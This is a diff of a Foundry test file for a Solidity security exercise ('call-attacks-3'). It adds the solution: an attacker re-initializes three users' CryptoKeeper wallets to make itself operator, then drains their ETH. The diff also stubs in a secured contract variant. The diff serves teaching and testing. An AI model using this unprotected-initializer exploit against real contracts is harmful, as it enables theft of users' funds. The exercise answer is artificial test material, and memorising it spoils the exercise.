@@ -7,12 +7,12 @@ import "src/utils/DummyERC20.sol";
 import "src/call-attacks-3/CryptoKeeper.sol";
 import "src/call-attacks-3/ICryptoKeeper.sol";
 import "src/call-attacks-3/CryptoKeeperFactory.sol";
+// import "src/call-attacks-3/SecuredCryptoKeeper.sol";
 
 /**
  * @dev run "forge test -vvv --match-contract CA3"
  */
 contract TestCA3 is Test {
-
     address deployer = makeAddr("deployer");
     address user1 = makeAddr("user1");
     address user2 = makeAddr("user2");
@@ -21,14 +21,18 @@ contract TestCA3 is Test {
 
     DummyERC20 token;
     CryptoKeeper cryptoKeeperTemplate;
-	CryptoKeeperFactory cryptoKeeperFactory ;
-	CryptoKeeper cryptoKeeper1;
-    CryptoKeeper cryptoKeeper2; 
+    // SecuredCryptoKeeper cryptoKeeperTemplate;
+    CryptoKeeperFactory cryptoKeeperFactory;
+    CryptoKeeper cryptoKeeper1;
+    // SecuredCryptoKeeper cryptoKeeper1;
+    CryptoKeeper cryptoKeeper2;
+    // SecuredCryptoKeeper cryptoKeeper2;
     CryptoKeeper cryptoKeeper3;
+    // SecuredCryptoKeeper cryptoKeeper3;
 
     uint256 attackerInitialBalance;
     uint8 constant CALL_OPERATION = 1;
-    
+
     function setUp() public {
         /* SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
         vm.startPrank(deployer);
@@ -39,6 +43,7 @@ contract TestCA3 is Test {
 
         // Deploy Template and Factory
         cryptoKeeperTemplate = new CryptoKeeper();
+        // cryptoKeeperTemplate = new SecuredCryptoKeeper();
         cryptoKeeperFactory = new CryptoKeeperFactory(deployer, address(cryptoKeeperTemplate));
         address[] memory operators = new address[](1);
 
@@ -47,33 +52,36 @@ contract TestCA3 is Test {
         operators[0] = user1;
         bytes32 user1Salt = keccak256(abi.encodePacked(user1));
         cryptoKeeper1 = CryptoKeeper(payable(cryptoKeeperFactory.createCryptoKeeper(user1Salt, operators)));
+        // cryptoKeeper1 = SecuredCryptoKeeper(payable(cryptoKeeperFactory.createCryptoKeeper(user1Salt, operators)));
 
         // User2 creating CryptoKeeperscreateCryptoKeeper
         vm.startPrank(user2);
         operators[0] = user2;
         bytes32 user2Salt = keccak256(abi.encodePacked(user2));
         cryptoKeeper2 = CryptoKeeper(payable(cryptoKeeperFactory.createCryptoKeeper(user2Salt, operators)));
+        // cryptoKeeper2 = SecuredCryptoKeeper(payable(cryptoKeeperFactory.createCryptoKeeper(user2Salt, operators)));
 
         // User3 creating CryptoKeepers
         vm.startPrank(user3);
         operators[0] = user3;
         bytes32 user3Salt = keccak256(abi.encodePacked(user3));
         cryptoKeeper3 = CryptoKeeper(payable(cryptoKeeperFactory.createCryptoKeeper(user3Salt, operators)));
+        // cryptoKeeper3 = SecuredCryptoKeeper(payable(cryptoKeeperFactory.createCryptoKeeper(user3Salt, operators)));
 
         // Users load their cryptoKeeper with some ETH
         vm.deal(user1, 10 ether);
         vm.startPrank(user1);
-        (bool success, ) = address(cryptoKeeper1).call{value: 10 ether}("");
+        (bool success,) = address(cryptoKeeper1).call{value: 10 ether}("");
         assertTrue(success);
 
         vm.deal(user2, 10 ether);
         vm.startPrank(user2);
-        (success, ) = address(cryptoKeeper2).call{value: 10 ether}("");
+        (success,) = address(cryptoKeeper2).call{value: 10 ether}("");
         assertTrue(success);
 
         vm.deal(user3, 10 ether);
         vm.startPrank(user3);
-        (success, ) = address(cryptoKeeper3).call{value: 10 ether}("");
+        (success,) = address(cryptoKeeper3).call{value: 10 ether}("");
         assertTrue(success);
 
         // cryptoKeeper operation works
@@ -85,7 +93,7 @@ contract TestCA3 is Test {
         cryptoKeeper3.executeWithValue(user1, "0x0", 1 ether);
 
         // Only operator can manage wallet
-		
+
         // addOperator fails
         vm.startPrank(user2);
         vm.expectRevert("Not an operator");
@@ -104,9 +112,23 @@ contract TestCA3 is Test {
     }
 
     function testCallAttack3() public {
-        /** CODE YOUR SOLUTION HERE */
-        
-        /** SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
+
+        /**
+         * SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE
+         */
+        vm.startPrank(attacker);
+
+        address[] memory fakeOperators = new address[](1);
+        fakeOperators[0] = attacker;
+        cryptoKeeper1.initialize(fakeOperators);
+        cryptoKeeper1.executeWithValue(attacker, "", address(cryptoKeeper1).balance);
+        cryptoKeeper2.initialize(fakeOperators);
+        cryptoKeeper2.executeWithValue(attacker, "", address(cryptoKeeper2).balance);
+        cryptoKeeper3.initialize(fakeOperators);
+        cryptoKeeper3.executeWithValue(attacker, "", address(cryptoKeeper3).balance);
 
         // Attacker suppose to steal all the ETH from the Crypto Keepers
         assertEq(address(cryptoKeeper1).balance, 0);
